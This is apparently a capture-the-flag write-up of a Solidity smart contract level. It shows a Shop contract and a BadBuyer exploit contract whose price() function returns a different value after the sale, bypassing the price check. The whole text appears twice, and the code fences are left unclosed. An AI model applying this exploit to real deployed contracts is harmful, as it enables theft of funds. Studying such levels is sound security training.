# Exploiting a Smart Contract Vulnerability in Solidity

In a smart contract level, there is a scenario where one has to buy at a price less than the set price. However, a restriction exists within the contract which checks if `_buyer.price()` is less than the set price. Consequently, attempting to purchase at prices lower than the set price fails.

The contract operates by calling a contract that implements the `Buyer` interface, without the exact implementation details of the `price()` function being known. This creates an opportunity for exploitation by implementing a malicious interface that returns different prices in different calls.

## Implementation

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface Buyer {
      function price() external view returns (uint);
    }
    
    contract Shop {
      uint public price = 100;
      bool public isSold;
    
      function buy() public {
        Buyer _buyer = Buyer(msg.sender);
    
        if (_buyer.price() >= price && !isSold) {
          isSold = true;
          price = _buyer.price();
        }
      }
    }


To exploit this vulnerability, we create a contract BadBuyer that implements the Buyer interface. This contract manipulates the price() function to return different values based on certain conditions.

    ```solidity
    contract BadBuyer is Buyer { 
      Shop target;
      constructor(address _target) {
        target = Shop(_target);
      }
    
      function price() external view override returns (uint) {
        return target.isSold() ? 0 : 100;
      }
    
      function pwn() public {
        target.buy();
      }
    }


# Exploiting a Smart Contract Vulnerability in Solidity

In a smart contract level, there is a scenario where one has to buy at a price less than the set price. However, a restriction exists within the contract which checks if `_buyer.price()` is less than the set price. Consequently, attempting to purchase at prices lower than the set price fails.

The contract operates by calling a contract that implements the `Buyer` interface, without the exact implementation details of the `price()` function being known. This creates an opportunity for exploitation by implementing a malicious interface that returns different prices in different calls.

## Implementation
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface Buyer {
      function price() external view returns (uint);
    }
    
    contract Shop {
      uint public price = 100;
      bool public isSold;
    
      function buy() public {
        Buyer _buyer = Buyer(msg.sender);
    
        if (_buyer.price() >= price && !isSold) {
          isSold = true;
          price = _buyer.price();
        }
      }
    }

To exploit this vulnerability, we create a contract BadBuyer that implements the Buyer interface. This contract manipulates the price() function to return different values based on certain conditions.

    ```solidity
    contract BadBuyer is Buyer { 
      Shop target;
      constructor(address _target) {
        target = Shop(_target);
      }
    
      function price() external view override returns (uint) {
        return target.isSold() ? 0 : 100;
      }
    
      function pwn() public {
        target.buy();
      }
    }

### Exploitation
The BadBuyer contract returns different prices depending on whether the shop is sold or not. This inconsistency can be exploited to bypass the restriction set by the shop contract. By calling the pwn() function of the BadBuyer contract, the buy() function of the shop contract is invoked, potentially allowing a purchase at a price lower than the set price.

Submit an instance of the BadBuyer contract to exploit the vulnerability and potentially clear the level.

